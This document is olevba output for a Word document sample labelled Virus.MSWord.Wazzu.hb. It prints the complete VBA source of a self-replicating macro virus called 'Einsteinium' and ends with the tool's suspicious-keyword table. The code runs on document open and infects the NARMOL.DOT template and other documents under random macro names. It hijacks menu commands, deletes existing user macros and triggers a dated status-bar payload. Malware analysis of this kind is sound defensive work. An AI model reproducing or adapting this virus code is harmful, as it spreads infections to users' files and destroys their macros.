olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu.hb-be8f088f2f0c8b57180b3175a23eaa6cda0416f2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu.hb-be8f088f2f0c8b57180b3175a23eaa6cda0416f2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Wazzu.hb-be8f088f2f0c8b57180b3175a23eaa6cda0416f2 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Einsteinium v.1.1.  (White Virus)
'Solidarity  M  Forever
'Medan 1997

Dim F$, ww, cn, ca, a, tj$, k, gd, FM1$, FM2$, FM3$, xo$, xc$, xt$, xm$, xf$, xe$, xn$, xg$

Public Sub MAIN()
Attribute MAIN.VB_Description = "3Ein.steinium1"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim wn$
F$ = ""
ww = 0
cn = 0
ca = 0
a = 0
tj$ = ""
k = 0
gd = 0
FM1$ = ""
FM2$ = ""
FM3$ = ""
xo$ = ""
xc$ = ""
xt$ = ""
xm$ = ""
xf$ = ""
xe$ = ""
xn$ = ""
xg$ = ""
WordBasic.DisableInput 1
F$ = WordBasic.[FileName$]()
If F$ = "" Or UCase(WordBasic.[Left$](F$, 8)) = "DOCUMENT" Then GoTo m1
Singkat
wn$ = WordBasic.[WindowName$]()
Dim fsa As Object: Set fsa = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs fsa
If fsa.Format = 0 Then
    fsa.Format = 1
    WordBasic.FileSaveAs fsa
    F$ = WordBasic.[FileName$]()
End If
CariTujuan (k)
WordBasic.Activate wn$
ca = WordBasic.CountMacros(1)
CheckFile
If ca = 0 Then GoTo m1
CheckGlobal
If ww <> 0 Then WordBasic.FileSaveAll 1
m1:
Tutup
Aksi
WordBasic.DisableInput 0
End Sub

Private Sub CariTujuan(k)
Dim i
Dim AN$
Dim su$
Dim CD$
i = 1
k = 0
While i <= WordBasic.CountAddIns()
    AN$ = WordBasic.[GetAddInName$](i)
    If UCase(WordBasic.[Right$](AN$, 10)) = "NARMOL.DOT" Then
        tj$ = AN$
        k = k + 1
        i = WordBasic.CountAddIns()
        WordBasic.AddInState AN$, 1
    End If
    i = i + 1
Wend
su$ = WordBasic.[DefaultDir$](8)
If k < 1 And su$ <> "" Then
    CD$ = WordBasic.[Files$](".")
    WordBasic.ChDir su$
    If WordBasic.[Files$](xn$) <> "" Then
        k = k + 1
        tj$ = su$ + "\" + xn$
    End If
    If CD$ <> "" Then WordBasic.ChDir CD$
End If
If k < 1 And su$ <> "" Then
    tj$ = su$ + "\" + xn$
    WordBasic.FileNew
    On Error GoTo -1: On Error GoTo ct1
    WordBasic.FileSaveAs Name:=tj$, Format:=1
    k = k + 1
ct1:
End If
If k < 1 And su$ = "" Then
    tj$ = "zxz"
    cn = WordBasic.CountMacros(0)
Else
    cn = WordBasic.CountMacros(0, 0, 1)
End If
End Sub

Private Sub CheckFile()
Dim o
Dim x
Dim h
Dim MA$
Dim MD$
Dim si$
Dim j
If ca = 0 Then TularFile
o = 0
ReDim sp__$(ca)
x = 0
For h = 1 To ca
    MA$ = WordBasic.[MacroName$](h, 1)
    MD$ = WordBasic.[MacroDesc$](MA$)
    If Tes(MD$) = 1 Then
        si$ = Mid(MD$, 2, 3)
        If si$ = "Ein" Then
            FM1$ = MA$
        ElseIf si$ = "han" Then
            FM2$ = MA$
        ElseIf si$ = "pen" Then
            FM3$ = MA$
        End If
        o = o + 1
    ElseIf UCase(MA$) = "AUTOOPEN" Or UCase(MA$) = "AUTOCLOSE" Then
        x = x + 1
        sp__$(x) = MA$
    End If
Next h
If x = 0 And o = 3 Then GoTo cf1
If x > 0 Then
    For j = 1 To x
        MD$ = WordBasic.[MacroDesc$](sp__$(j))
        If Tes(MD$) = 1 Then GoTo lain
        On Error GoTo -1: On Error GoTo lain
        WordBasic.Organizer Delete:=1, Source:=F$, Name:=sp__$(j), Tab:=3
lain:
    Next j
End If
If o <> 3 And ca <> 0 Then TularFile
cf1:
End Sub

Private Sub TularFile()
Dim y
Dim i
Dim FM$
Dim GM$
ReDim SM__$(3)
ReDim TM__$(3)
If a < 4 Then TM__$(1) = xo$ Else TM__$(1) = xc$
TM__$(2) = pl$(y)
tf1:
TM__$(3) = pl$(y)
If UCase(TM__$(2)) = UCase(TM__$(1)) Then GoTo tf1
SM__$(1) = xe$
SM__$(2) = xf$
SM__$(3) = xt$
For i = 1 To 3
    If tj$ <> "zxz" Then
        On Error GoTo -1: On Error GoTo tf2
        WordBasic.Organizer Copy:=1, Source:=tj$, Destination:=F$, Name:=SM__$(i), Tab:=3
        WordBasic.Organizer Rename:=1, Source:=F$, Name:=SM__$(i), NewName:=TM__$(i), Tab:=3
tf2:
    Else
        FM$ = F$ + ":" + TM__$(i)
        GM$ = xg$ + SM__$(i)
        On Error GoTo -1: On Error GoTo tf3
        WordBasic.MacroCopy GM$, FM$, 1
tf3:
    End If
Next i
WordBasic.FileSave
End Sub

Private Sub CheckGlobal()
Dim r
Dim x
Dim i
Dim MN$
Dim MD$
Dim cmn
Dim j
r = 0
x = 0
If cn = 0 Then
    TularGlobal
    GoTo cg1
End If
For i = 1 To cn
    If tj$ = "zxz" Then
        MN$ = WordBasic.[MacroName$](i, 0)
    Else
        MN$ = WordBasic.[MacroName$](i, 0, 0, 1)
    End If
    MD$ = WordBasic.[MacroDesc$](MN$)
    If Tes(MD$) = 1 Then
        If MN$ = xe$ Or MN$ = xf$ Or MN$ = xt$ Then r = r + 1
    End If
Next i
cg1:
x = 0
gd = 0
cmn = WordBasic.CountMacros(0)
ReDim sp__$(cmn)
For i = 1 To cmn
    MN$ = WordBasic.[MacroName$](i, 0)
    MD$ = WordBasic.[MacroDesc$](MN$)
    If Tes(MD$) = 1 Then
        If MN$ = xc$ Or MN$ = xm$ Then gd = gd + 1
    Else
        x = x + 1
        ww = x
        sp__$(x) = MN$
    End If
Next i
If x > 0 Then
    For j = 1 To x
        On Error GoTo -1: On Error GoTo cg2
        WordBasic.ToolsMacro Name:=sp__$(j), Show:=1, Delete:=1
cg2:
    Next j
End If
If r <> 3 And cn <> 0 Then TularGlobal
If gd < 2 Then Gandakan
Tutup
cg3:
End Sub

Private Sub TularGlobal()
Dim i
Dim FM$
Dim GM$
ww = ww + 1
ReDim SM__$(4)
ReDim TM__$(4)
SM__$(1) = FM1$
SM__$(2) = FM3$
SM__$(3) = FM2$
SM__$(4) = FM3$
TM__$(1) = xe$
TM__$(2) = xf$
TM__$(3) = xt$
TM__$(4) = "Show"
For i = 1 To 4
    If tj$ <> "zxz" Then
        On Error GoTo -1: On Error GoTo tg1
        If i <> 1 Then
            WordBasic.Organizer Rename:=1, Source:=F$, Name:=SM__$(i), NewName:=TM__$(i), Tab:=3
            WordBasic.Organizer Copy:=1, Source:=F$, Destination:=tj$, Name:=TM__$(i), Tab:=3
            WordBasic.Organizer Rename:=1, Source:=F$, Name:=TM__$(i), NewName:=SM__$(i), Tab:=3
        Else
            WordBasic.Organizer Copy:=1, Source:=F$, Destination:=tj$, Name:=SM__$(i), Tab:=3
            WordBasic.Organizer Rename:=1, Source:=tj$, Name:=SM__$(i), NewName:=TM__$(i), Tab:=3
        End If
tg1:
    Else
        FM$ = F$ + ":" + SM__$(i)
        GM$ = xg$ + TM__$(i)
        On Error GoTo -1: On Error GoTo tg2
        WordBasic.MacroCopy FM$, GM$, 1
tg2:
    End If
Next i
tg3:
WordBasic.SetTemplateDirty 0
End Sub

Private Sub Gandakan()
Dim FM$
Dim i
If FM2$ = "" Then GoTo g2
ReDim TM__$(2)
TM__$(1) = xg$ + xc$
TM__$(2) = xg$ + xm$
FM$ = F$ + ":" + FM2$
For i = 1 To 2
        On Error GoTo -1: On Error GoTo g1
        WordBasic.MacroCopy FM$, TM__$(i), 1
g1:
Next i
g2:
gd = 2
ww = gd
End Sub

Private Sub Aksi()
Dim th
Dim bl
Dim w
Dim z$
th = WordBasic.Year(WordBasic.Now())
If th < 1998 Then GoTo a2
bl = WordBasic.Month(WordBasic.Now())
If bl = 1 Or bl = 2 Then
    If th = 1998 Then GoTo a2
End If
w = WordBasic.Val(WordBasic.[GetProfileString$]("Emc2", "E"))
z$ = Str(w + 1)
If w < 53 Then GoTo a1
On Error GoTo -1: On Error GoTo a1
WordBasic.Call "Show_.Tampil"
z$ = "1"
a1:
WordBasic.SetProfileString "Emc2", "E", z$
a2:
End Sub

Private Sub Tutup()
Dim i
i = 1
While i <= WordBasic.CountWindows()
    If WordBasic.[WindowName$](i) = "NARMOL.DOT" Then
        WordBasic.Activate "NARMOL.DOT"
        WordBasic.DisableAutoMacros 1
        WordBasic.FileClose 1
        WordBasic.DisableAutoMacros 0
        i = CountWindow
        WordBasic.ToolsOptionsGeneral RecentFiles:=0
        WordBasic.ToolsOptionsGeneral RecentFiles:=1
        WordBasic.ToolsOptionsGeneral RecentFileCount:=5
    End If
    i = i + 1
Wend
End Sub

Private Function Tes(MD$)
Dim m
If Len(MD$) < 6 Then MD$ = "pemalas"
m = 0
If WordBasic.Val(WordBasic.[Right$](MD$, 1)) >= 1 And Mid(MD$, 5, 1) = "." Then m = 1
Tes = m
End Function

Private Sub Singkat()
a = WordBasic.Int(Rnd() * 10)
ca = 0
cn = 0
ww = 0
FM2$ = ""
tj$ = ""
xo$ = "AutoOpen"
xc$ = "AutoClose"
xt$ = "FileTemplates"
xm$ = "ToolsMacro"
xf$ = "FileOpen"
xe$ = "Einstein"
xn$ = "narmol.dot"
xg$ = "Global:"
End Sub

Private Function pl$(y)
Dim i
Dim s
Dim r
Dim x$
ReDim c__$(52)
For i = 1 To 26
    c__$(i + 26) = Chr(96 + i)
    c__$(i) = Chr(64 + i)
Next i
s = WordBasic.Int(Rnd() * 7) + 3
For i = 1 To s
    r = WordBasic.Int(Rnd() * 51) + 1
    x$ = x$ + c__$(r)
Next i
pl$ = x$
End Function
-------------------------------------------------------------------------------
VBA MACRO UjXlPG.bas 
in file: Virus.MSWord.Wazzu.hb-be8f088f2f0c8b57180b3175a23eaa6cda0416f2 - OLE stream: 'Macros/VBA/UjXlPG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "3han.ges the active template and the template option1"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.UjXlPG.MAIN"
Dim c
Dim i
Dim o
c = WordBasic.CountMacros(0, 1, 0)
For i = 1 To c
    If WordBasic.[MacroName$](i, 0, 1, 0) = "Einstein" Then
        o = 5
        i = c
    End If
Next i
On Error GoTo -1: On Error GoTo uh
If o = 5 Then WordBasic.Call "Einstein.Main"
uh:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ijd.bas 
in file: Virus.MSWord.Wazzu.hb-be8f088f2f0c8b57180b3175a23eaa6cda0416f2 - OLE stream: 'Macros/VBA/ijd'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "3pen.s document or templat1"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ijd.MAIN"
    WordBasic.DisableAutoMacros 1
    Dim fop As Object: Set fop = WordBasic.DialogRecord.FileOpen(False)
    WordBasic.CurValues.FileOpen fop
    On Error GoTo -1: On Error GoTo owp
    WordBasic.Dialog.FileOpen fop
    On Error GoTo -1: On Error GoTo owp
    WordBasic.FileOpen fop
    Dim fsa As Object: Set fsa = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs fsa
    On Error GoTo -1: On Error GoTo owp
    If fsa.Format = 1 Then WordBasic.Call "Einstein.Main"
owp:
    WordBasic.DisableAutoMacros 0
End Sub

Private Sub Tampil()
Dim u
Dim t
Dim l
Dim d
Dim v
Dim o
Dim s$
Dim e$
Dim i
Dim h
Dim j
Dim b$
Dim c$
c$ = Space(255)
u = 92328233527#
t = WordBasic.Second(WordBasic.Now())
If t > 57 Then
    l = 250
    GoTo hh
End If
While d <= 2
    d = WordBasic.Second(WordBasic.Now()) - t
    l = l + 0.4
Wend
hh:
v = 19232833341#
For o = 1 To 85
    s$ = s$ + " "
Next o
e$ = WordBasic.[LTrim$](Str(v)) + WordBasic.[LTrim$](Str(u))
For i = 2 To 43 Step 2
    If (i + 2) Mod 4 = 0 Then h = (WordBasic.Val(Mid(e$, i / 2, 2)) + 50) Else h = 90
    For j = 65 To h
        b$ = Chr(j)
        WordBasic.PrintStatusBar s$ + c$ + b$
            tn (l)
    Next j
    If (i + 2) Mod 4 <> 0 Then b$ = " "
c$ = c$ + b$
Next i
tn l * 10
WordBasic.Beep
End Sub

Private Sub tn(l)
Dim i
For i = 1 To WordBasic.Int(l)
Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
